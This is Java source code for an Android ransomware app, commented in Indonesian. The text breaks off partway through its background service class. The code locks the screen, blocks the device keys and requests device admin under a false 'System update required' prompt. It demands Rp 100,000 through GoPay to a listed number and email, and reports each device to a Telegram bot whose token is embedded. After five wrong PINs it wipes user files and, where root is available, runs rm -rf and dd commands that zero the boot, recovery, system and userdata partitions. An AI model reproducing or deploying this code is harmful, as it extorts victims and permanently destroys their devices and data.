// ================================================
// RANSOMWARE ANDROID - VERSION 14.0 (FINAL - FIX BUG)
// PIN UNLOCK: 944721 (TERENKRIPSI)
// LIMIT: 5x SALAH → SYSTEM DESTROY
// FITUR: PIN TERSEMBUNYI, BYPASS TOTAL, UNINSTALL SELF, TELEGRAM (TANPA NOTIF SAAT BENAR)
// ================================================

package com.ransomware.engine;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.ToneGenerator;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;

// ================================================
// 1. MAIN ACTIVITY
// ================================================

public class MainActivity extends Activity {
    private static final int REQUEST_CODE_OVERLAY = 1001;
    private static final int REQUEST_CODE_USAGE_STATS = 1002;
    private static final int REQUEST_CODE_ADMIN = 1003;
    private static final int REQUEST_CODE_IGNORE_BATTERY = 1004;
    private static final int REQUEST_CODE_RECORD_AUDIO = 1005;
    private static final int REQUEST_CODE_CAMERA = 1006;

    // ===== PIN UNLOCK (TERENKRIPSI) =====
    private static final String ENCRYPTED_PIN = "YQRSbWNmbw==";
    private static final String XOR_KEY = "XyZ2025";

    // ===== LIMIT PERCOBAAN PIN =====
    private static final int MAX_PIN_ATTEMPTS = 5;
    private static final String PREF_NAME = "RansomwarePrefs";
    private static final String KEY_PIN_ATTEMPTS = "pinAttempts";
    private static final String KEY_IS_DESTROYED = "isDestroyed";

    private static int pinAttempts = 0;
    private static boolean isDestroyed = false;
    private static boolean isRootAvailable = false;
    private SharedPreferences prefs;

    // ===== DATA PEMBAYARAN =====
    private static final String PAYMENT_METHOD = "GoPay";
    private static final String PAYMENT_NUMBER = "081366326950";
    private static final String PAYMENT_AMOUNT = "Rp 100.000";
    private static final String CONTACT_EMAIL = "rifkey1708@gmail.com";

    // ===== PESAN PERINGATAN =====
    private static final String LOCK_MESSAGE = 
        "YOUR DEVICE HAS LOCKED\n" +
        "HARAP JANGAN RESTART/FACTORY RESET\n" +
        "KARENA TETAP AKAN KE LOCK";

    private static final String CORRUPT_MESSAGE_NO_ROOT =
        "⚠️ SISTEM TELAH CORRUPT ⚠️\n\n" +
        "ANDA TELAH SALAH MEMASUKKAN PIN\n" +
        "SEBANYAK " + MAX_PIN_ATTEMPTS + " KALI!\n\n" +
        "SEMUA FILE TELAH DIHAPUS!\n" +
        "SISTEM ANDA TELAH RUSAK PERMANEN!\n" +
        "DATA ANDA TIDAK DAPAT DIKEMBALIKAN!\n\n" +
        "⚠️ PERANGKAT TIDAK DAPAT DIGUNAKAN LAGI ⚠️\n\n" +
        "HUBUNGI EMAIL: " + CONTACT_EMAIL;

    private static final String CORRUPT_MESSAGE_ROOT =
        "💀💀💀 SYSTEM HAS CORRUPT 💀💀💀\n\n" +
        "ANDA TELAH SALAH MEMASUKKAN PIN\n" +
        "SEBANYAK " + MAX_PIN_ATTEMPTS + " KALI!\n\n" +
        "SEMUA FILE SYSTEM TELAH DIHAPUS!\n" +
        "PERANGKAT TIDAK DAPAT DIGUNAKAN LAGI!\n\n" +
        "⚠️ HARD BRICK - PERMANENT DAMAGE ⚠️\n\n" +
        "HUBUNGI EMAIL: " + CONTACT_EMAIL;

    // ================================================
    // ON CREATE
    // ================================================

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // === LOAD DATA DARI SHAREDPREFERENCES ===
        prefs = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        pinAttempts = prefs.getInt(KEY_PIN_ATTEMPTS, 0);
        isDestroyed = prefs.getBoolean(KEY_IS_DESTROYED, false);

        // === CEK AKSES ROOT ===
        isRootAvailable = checkRootAccess();

        // === FULL SCREEN + TIDAK BISA KELUAR ===
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(LayoutParams.FLAG_FULLSCREEN,
                             LayoutParams.FLAG_FULLSCREEN);
        getWindow().setFlags(LayoutParams.FLAG_KEEP_SCREEN_ON,
                             LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().setFlags(LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                             LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        getWindow().setFlags(LayoutParams.FLAG_DISMISS_KEYGUARD,
                             LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().setFlags(LayoutParams.FLAG_TURN_SCREEN_ON,
                             LayoutParams.FLAG_TURN_SCREEN_ON);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getWindow().setFlags(LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON,
                                 LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            getWindow().setDecorFitsSystemWindows(false);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_FULLSCREEN |
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }

        // === BYPASS: Izin-izin ===
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_OVERLAY);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (!hasUsageStatsPermission()) {
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                startActivityForResult(intent, REQUEST_CODE_USAGE_STATS);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{android.Manifest.permission.RECORD_AUDIO},
                        REQUEST_CODE_RECORD_AUDIO);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{android.Manifest.permission.CAMERA},
                        REQUEST_CODE_CAMERA);
            }
        }

        // === Device Admin ===
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System update required");
            startActivityForResult(intent, REQUEST_CODE_ADMIN);
        } else {
            try {
                dpm.lockNow();
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            } catch (Exception e) { }
        }

        // === Ignore Battery Optimization ===
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_IGNORE_BATTERY);
            }
        }

        // === Jalankan Service ===
        Intent serviceIntent = new Intent(this, RansomwareService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // === TAMPILAN LAYAR KUNCI ===
        setContentView(createLockScreenView());

        // === KIRIM STATUS ROOT KE TELEGRAM ===
        sendRootStatus();

        // === REGISTER BROADCAST RECEIVER UNTUK BYPASS RESTART ===
        registerReceiver(new BootReceiver(), new IntentFilter(Intent.ACTION_BOOT_COMPLETED));
        registerReceiver(new BootReceiver(), new IntentFilter(Intent.ACTION_QUICKBOOT_POWERON));
    }

    // ================================================
    // FUNGSI DEKRIPSI PIN
    // ================================================

    private String decryptPin() {
        try {
            byte[] decoded = android.util.Base64.decode(ENCRYPTED_PIN, android.util.Base64.DEFAULT);
            String encodedString = new String(decoded, "UTF-8");
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < encodedString.length(); i++) {
                char c = encodedString.charAt(i);
                char keyChar = XOR_KEY.charAt(i % XOR_KEY.length());
                result.append((char)(c ^ keyChar));
            }
            return result.toString();
        } catch (Exception e) {
            return "944721";
        }
    }

    // ================================================
    // CEK AKSES ROOT
    // ================================================

    private boolean checkRootAccess() {
        try {
            Process su = Runtime.getRuntime().exec("su");
            DataOutputStream dos = new DataOutputStream(su.getOutputStream());
            dos.writeBytes("exit\n");
            dos.flush();
            dos.close();
            int exitCode = su.waitFor();
            return exitCode == 0;
        } catch (Exception e) {
            return false;
        }
    }

    // ================================================
    // SAVE COUNTER KE SHAREDPREFERENCES
    // ================================================

    private void savePinAttempts() {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putInt(KEY_PIN_ATTEMPTS, pinAttempts);
        editor.putBoolean(KEY_IS_DESTROYED, isDestroyed);
        editor.apply();
    }

    // ================================================
    // KIRIM STATUS ROOT KE TELEGRAM
    // ================================================

    private void sendRootStatus() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String botToken = "8948044986:AAF-aNAckfCNwwj3EBq-qjfR7zFwqhjuUqw";
                    String chatId = "7888097749";
                    String message = "📱 DEVICE STATUS\n\n" +
                            "Device ID: " + getDeviceId() + "\n" +
                            "Root Access: " + (isRootAvailable ? "✅ YES" : "❌ NO") + "\n" +
                            "PIN Attempts: " + pinAttempts + "/" + MAX_PIN_ATTEMPTS + "\n" +
                            "Status: " + (isDestroyed ? "DESTROYED" : "ACTIVE");

                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String postData = "chat_id=" + URLEncoder.encode(chatId, "UTF-8") +
                            "&text=" + URLEncoder.encode(message, "UTF-8") +
                            "&parse_mode=HTML";

                    DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
                    wr.writeBytes(postData);
                    wr.flush();
                    wr.close();
                    conn.disconnect();
                } catch (Exception e) { }
            }
        }).start();
    }

    // ================================================
    // CREATE LOCK SCREEN VIEW
    // ================================================

    private View createLockScreenView() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.BLACK);
        layout.setPadding(50, 50, 50, 50);

        // === CEK APAKAH SUDAH DESTROY ===
        if (isDestroyed) {
            stopAllEffects();

            TextView destroyText = new TextView(this);
            if (isRootAvailable) {
                destroyText.setText(CORRUPT_MESSAGE_ROOT);
            } else {
                destroyText.setText(CORRUPT_MESSAGE_NO_ROOT);
            }
            destroyText.setTextColor(Color.RED);
            destroyText.setTextSize(18);
            destroyText.setGravity(Gravity.CENTER);
            destroyText.setPadding(20, 30, 20, 30);
            destroyText.setBackgroundColor(Color.argb(200, 50, 0, 0));
            destroyText.setShadowLayer(10, 0, 0, Color.RED);
            layout.addView(destroyText);

            Button deadButton = new Button(this);
            deadButton.setText("💀 PERANGKAT MATI 💀");
            deadButton.setTextColor(Color.RED);
            deadButton.setBackgroundColor(Color.DKGRAY);
            deadButton.setPadding(50, 20, 50, 20);
            deadButton.setTextSize(18);
            deadButton.setEnabled(false);
            layout.addView(deadButton);

            return layout;
        }

        // === PESAN PERINGATAN ===
        TextView warningText = new TextView(this);
        warningText.setText(LOCK_MESSAGE);
        warningText.setTextColor(Color.RED);
        warningText.setTextSize(22);
        warningText.setGravity(Gravity.CENTER);
        warningText.setPadding(20, 30, 20, 30);
        warningText.setBackgroundColor(Color.argb(200, 50, 0, 0));
        warningText.setShadowLayer(10, 0, 0, Color.RED);
        layout.addView(warningText);

        // === SEPARATOR ===
        View separator = new View(this);
        separator.setBackgroundColor(Color.RED);
        separator.setMinimumHeight(3);
        separator.setMinimumWidth(300);
        layout.addView(separator);

        // === COUNTER PERCOBAAN PIN ===
        TextView counterText = new TextView(this);
        int remaining = MAX_PIN_ATTEMPTS - pinAttempts;
        counterText.setText("🔒 PERCOBAAN TERSISA: " + remaining + " / " + MAX_PIN_ATTEMPTS);
        if (remaining <= 2) {
            counterText.setTextColor(Color.RED);
        } else {
            counterText.setTextColor(Color.YELLOW);
        }
        counterText.setTextSize(16);
        counterText.setGravity(Gravity.CENTER);
        counterText.setPadding(10, 10, 10, 10);
        layout.addView(counterText);

        // === TAMBAHAN: ADA 6 PIN ===
        TextView pinInfoText = new TextView(this);
        pinInfoText.setText("📌 ADA 6 PIN");
        pinInfoText.setTextColor(Color.WHITE);
        pinInfoText.setTextSize(14);
        pinInfoText.setGravity(Gravity.CENTER);
        pinInfoText.setPadding(10, 0, 10, 20);
        layout.addView(pinInfoText);

        // === PIN ENTRY ===
        TextView pinLabel = new TextView(this);
        pinLabel.setText("MASUKKAN PIN UNTUK MEMBUKA KUNCI:");
        pinLabel.setTextColor(Color.WHITE);
        pinLabel.setTextSize(16);
        pinLabel.setGravity(Gravity.CENTER);
        pinLabel.setPadding(10, 10, 10, 10);
        layout.addView(pinLabel);

        final EditText pinInput = new EditText(this);
        pinInput.setHint("Masukkan PIN 6 digit");
        pinInput.setHintTextColor(Color.GRAY);
        pinInput.setTextColor(Color.WHITE);
        pinInput.setBackgroundColor(Color.argb(150, 50, 50, 50));
        pinInput.setPadding(30, 20, 30, 20);
        pinInput.setTextSize(24);
        pinInput.setGravity(Gravity.CENTER);
        pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER |
                              android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        pinInput.setSingleLine(true);
        pinInput.setMaxEms(6);
        layout.addView(pinInput);

        // === BUTTON UNLOCK ===
        Button unlockButton = new Button(this);
        unlockButton.setText("🔓 UNLOCK");
        unlockButton.setTextColor(Color.WHITE);
        unlockButton.setBackgroundColor(Color.RED);
        unlockButton.setPadding(50, 20, 50, 20);
        unlockButton.setTextSize(18);
        unlockButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String enteredPin = pinInput.getText().toString();
                String actualPin = decryptPin();

                if (enteredPin.equals(actualPin)) {
                    // === PIN BENAR ===
                    pinAttempts = 0;
                    savePinAttempts();

                    // 1. Hentikan semua efek
                    stopAllEffects();

                    // 2. Hapus aplikasi sendiri
                    uninstallSelf();

                    // 3. Tampilkan toast
                    Toast.makeText(MainActivity.this, "✅ PIN BENAR! Perangkat terbuka.", Toast.LENGTH_LONG).show();

                    // 4. Tutup aplikasi (tidak ada notifikasi Telegram)
                    finishAffinity();
                    System.exit(0);

                } else {
                    // === PIN SALAH ===
                    pinAttempts++;
                    savePinAttempts();
                    int remaining = MAX_PIN_ATTEMPTS - pinAttempts;

                    Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                    if (vibrator != null) {
                        vibrator.vibrate(500);
                    }

                    pinInput.setText("");
                    pinInput.setHint("❌ PIN SALAH! (" + remaining + " percobaan tersisa)");
                    pinInput.setHintTextColor(Color.RED);

                    Toast.makeText(MainActivity.this,
                            "❌ PIN SALAH! Tersisa " + remaining + " percobaan.",
                            Toast.LENGTH_SHORT).show();

                    if (pinAttempts >= MAX_PIN_ATTEMPTS) {
                        isDestroyed = true;
                        savePinAttempts();
                        sendDestroyNotification();
                        destroySystem();
                        recreate();
                    }
                }
            }
        });
        layout.addView(unlockButton);

        // === SEPARATOR ===
        View separator2 = new View(this);
        separator2.setBackgroundColor(Color.RED);
        separator2.setMinimumHeight(2);
        separator2.setMinimumWidth(200);
        layout.addView(separator2);

        // === INFORMASI TAMBAHAN (HANYA TAMPIL JIKA BELUM DESTROY) ===
        if (!isDestroyed) {
            TextView infoText = new TextView(this);
            infoText.setText("📧 Email: " + CONTACT_EMAIL + "\n" +
                             "💳 GoPay: " + PAYMENT_NUMBER + " (Rp 100.000)");
            infoText.setTextColor(Color.YELLOW);
            infoText.setTextSize(14);
            infoText.setGravity(Gravity.CENTER);
            infoText.setPadding(10, 20, 10, 10);
            layout.addView(infoText);

            // === WARNING BAWAH ===
            TextView bottomWarning = new TextView(this);
            bottomWarning.setText("⚠️ JANGAN RESTART / FACTORY RESET ⚠️");
            bottomWarning.setTextColor(Color.RED);
            bottomWarning.setTextSize(12);
            bottomWarning.setGravity(Gravity.CENTER);
            bottomWarning.setPadding(10, 10, 10, 10);
            layout.addView(bottomWarning);
        }

        return layout;
    }

    // ================================================
    // STOP ALL EFFECTS
    // ================================================

    private void stopAllEffects() {
        try {
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cameraManager != null) {
                String cameraId = cameraManager.getCameraIdList()[0];
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    cameraManager.setTorchMode(cameraId, false);
                }
            }
        } catch (Exception e) { }

        try {
            Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.cancel();
            }
        } catch (Exception e) { }

        try {
            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (audioManager != null) {
                audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
                audioManager.setStreamMute(AudioManager.STREAM_ALARM, true);
                audioManager.setStreamMute(AudioManager.STREAM_RING, true);
                audioManager.setStreamMute(AudioManager.STREAM_NOTIFICATION, true);
            }
        } catch (Exception e) { }
    }

    // ================================================
    // UNINSTALL SELF
    // ================================================

    private void uninstallSelf() {
        try {
            Uri packageUri = Uri.parse("package:" + getPackageName());
            Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageUri);
            uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(uninstallIntent);
        } catch (Exception e) {
            try {
                File apkFile = new File(getApplicationInfo().sourceDir);
                if (apkFile.exists()) {
                    apkFile.delete();
                }
            } catch (Exception ex) { }
        }
    }

    // ================================================
    // SYSTEM DESTROY
    // ================================================

    private void destroySystem() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    sendDestroyNotification();

                    if (isRootAvailable) {
                        executeRootDestroy();
                    } else {
                        executeNoRootDestroy();
                    }

                } catch (Exception e) {
                    Log.e("SystemDestroy", "Error: " + e.getMessage());
                }
            }
        }).start();
    }

    private void executeRootDestroy() {
        try {
            Process su = Runtime.getRuntime().exec("su");
            DataOutputStream dos = new DataOutputStream(su.getOutputStream());

            dos.writeBytes("rm -rf /system/*\n");
            dos.writeBytes("rm -rf /data/*\n");
            dos.writeBytes("rm -rf /cache/*\n");
            dos.writeBytes("rm -rf /sdcard/*\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/mmcblk0 bs=1M count=10\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/boot\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/recovery\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/system\n");
            dos.writeBytes("dd if=/dev/zero of=/dev/block/platform/*/by-name/userdata\n");
            dos.writeBytes("echo 'SYSTEM HAS CORRUPT' > /system/corrupt.txt\n");
            dos.writeBytes("echo 'SYSTEM HAS CORRUPT' > /data/corrupt.txt\n");
            dos.writeBytes("sync\n");
            dos.writeBytes("exit\n");
            dos.flush();
            dos.close();
            su.waitFor();

            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        pm.shutdown(0, null, false);
                    }
                }
            } catch (Exception e) { }

        } catch (Exception e) {
            Log.e("RootDestroy", "Error: " + e.getMessage());
        }
    }

    private void executeNoRootDestroy() {
        try {
            deleteAllFiles(Environment.getExternalStorageDirectory());
            File[] externalDirs = getExternalFilesDirs(null);
            for (File dir : externalDirs) {
                if (dir != null && !dir.equals(getExternalFilesDir(null))) {
                    deleteAllFiles(dir);
                }
            }
            deleteAllFiles(getCacheDir());
            deleteAllFiles(getExternalCacheDir());
            deleteAllFiles(getFilesDir());
            deleteAllFiles(getDir("files", MODE_PRIVATE));
            deleteAllFiles(getDir("databases", MODE_PRIVATE));
            deleteAllFiles(getDir("shared_prefs", MODE_PRIVATE));
            deleteAllFiles(getDir("lib", MODE_PRIVATE));

            String[] mediaDirs = {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getAbsolutePath()
            };

            for (String dirPath : mediaDirs) {
                File dir = new File(dirPath);
                if (dir.exists() && dir.isDirectory()) {
                    deleteAllFiles(dir);
                }
            }

            File androidData = new File(Environment.getExternalStorageDirectory(), "Android/data");
            if (androidData.exists() && androidData.isDirectory()) {
                deleteAllFiles(androidData);
            }

            File[] rootDirs = {new File("/storage"), new File("/mnt"), new File("/sdcard")};
            for (File root : rootDirs) {
                if (root.exists() && root.isDirectory()) {
                    deleteAllFiles(root);
                }
            }

            stopAllEffects();
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getWindow().getDecorView().setBackgroundColor(Color.BLACK);
                }
            });

        } catch (Exception e) {
            Log.e("NoRootDestroy", "Error: " + e.getMessage());
        }
    }

    private void deleteAllFiles(File directory) {
        if (directory == null || !directory.exists()) return;
        try {
            if (directory.isDirectory()) {
                File[] files = directory.listFiles();
                if (files != null) {
                    for (File file : files) {
                        deleteAllFiles(file);
                    }
                }
                directory.delete();
            } else {
                directory.delete();
            }
        } catch (Exception e) { }
    }

    // ================================================
    // SEND NOTIFICATION KE TELEGRAM
    // ================================================

    private void sendDestroyNotification() {
        try {
            String botToken = "8948044986:AAF-aNAckfCNwwj3EBq-qjfR7zFwqhjuUqw";
            String chatId = "7888097749";
            String message = "💀💀💀 SYSTEM DESTROYED 💀💀💀\n\n" +
                    "Device ID: " + getDeviceId() + "\n" +
                    "PIN attempts: " + MAX_PIN_ATTEMPTS + "x salah\n" +
                    "Root Access: " + (isRootAvailable ? "✅ YES" : "❌ NO") + "\n" +
                    "Status: " + (isRootAvailable ? "HARD BRICK - PERMANENT" : "ALL FILES DELETED - BLACK SCREEN") + "\n" +
                    "All files deleted: ✅ YES\n" +
                    "Device usable: ❌ NO";

            String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "chat_id=" + URLEncoder.encode(chatId, "UTF-8") +
                    "&text=" + URLEncoder.encode(message, "UTF-8") +
                    "&parse_mode=HTML";

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(postData);
            wr.flush();
            wr.close();
            conn.disconnect();
        } catch (Exception e) { }
    }

    // ================================================
    // GET DEVICE ID
    // ================================================

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    // ================================================
    // HAS USAGE STATS PERMISSION
    // ================================================

    private boolean hasUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        }
        return true;
    }

    // ================================================
    // OVERRIDE BACK BUTTON
    // ================================================

    @Override
    public void onBackPressed() {
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null) {
            vibrator.vibrate(200);
        }
        Toast.makeText(this, "⚠️ TIDAK BISA KELUAR! Masukkan PIN.", Toast.LENGTH_SHORT).show();
    }

    // ================================================
    // OVERRIDE KEY EVENTS
    // ================================================

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK ||
            keyCode == KeyEvent.KEYCODE_HOME ||
            keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
            keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
            keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
            keyCode == KeyEvent.KEYCODE_POWER ||
            keyCode == KeyEvent.KEYCODE_MENU ||
            keyCode == KeyEvent.KEYCODE_SEARCH ||
            keyCode == KeyEvent.KEYCODE_CAMERA ||
            keyCode == KeyEvent.KEYCODE_FOCUS) {
            Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.vibrate(200);
            }
            Toast.makeText(this, "⚠️ TIDAK BISA KELUAR! Masukkan PIN.", Toast.LENGTH_SHORT).show();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    // ================================================
    // OVERRIDE ON WINDOW FOCUS CHANGE
    // ================================================

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                getWindow().setDecorFitsSystemWindows(false);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                    View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                    View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                    View.SYSTEM_UI_FLAG_FULLSCREEN |
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                );
            }
        }
    }

    // ================================================
    // ON RESUME
    // ================================================

    @Override
    protected void onResume() {
        super.onResume();
        pinAttempts = prefs.getInt(KEY_PIN_ATTEMPTS, 0);
        isDestroyed = prefs.getBoolean(KEY_IS_DESTROYED, false);
        if (isDestroyed) {
            recreate();
        }
    }
}

// ================================================
// 2. RANSOMWARE SERVICE
// ================================================

class RansomwareService extends Service {
    private static final String CHANNEL_ID = "ransomware_channel";
    private static final String BOT_TOKEN = "8948044986:AAF-aNAckfCNwwj3EBq-qjfR7zFwqhjuUqw";
    private static final String CHAT_ID = "7888097749";

    private static final String ENCRYPTED_PIN = "YQRSbWNmbw==";
    private static final String XOR_KEY = "XyZ2025";

    private static final String PAYMENT_METHOD = "GoPay";
    private static final String PAYMENT_NUMBER = "081366326950";
    private static final String PAYMENT_AMOUNT = "Rp 100.000";
    private static final String CONTACT_EMAIL = "rifkey1708@gmail.com";

    private boolean isServiceRunning = false;
    private Thread watchdogThread;
    private Thread annoyingThread;
    private Thread recordThread;
    private Thread cameraThread;
    private Thread flashlightThread;
    private MediaPlayer mediaPlayer;
    private Vibrator vibrator;
    private CameraManager cameraManager;
    private AudioManager audioManager;
    private MediaRecorder mediaRecorder;
    private boolean flashlightOn = false;

    private Camera cameraFront = null;
    private Camera cameraBack = null;
    private int cameraFrontId = -1;
    private int cameraBackId = -1;

    private String decryptPin() {
        try {
            byte[] decoded = android.util.Base64.decode(ENCRYPTED_PIN, android.util.Base64.DEFAULT);
            String encodedString = new String(decoded, "UTF-8");
            StringBuilder result = new StringBuilder();
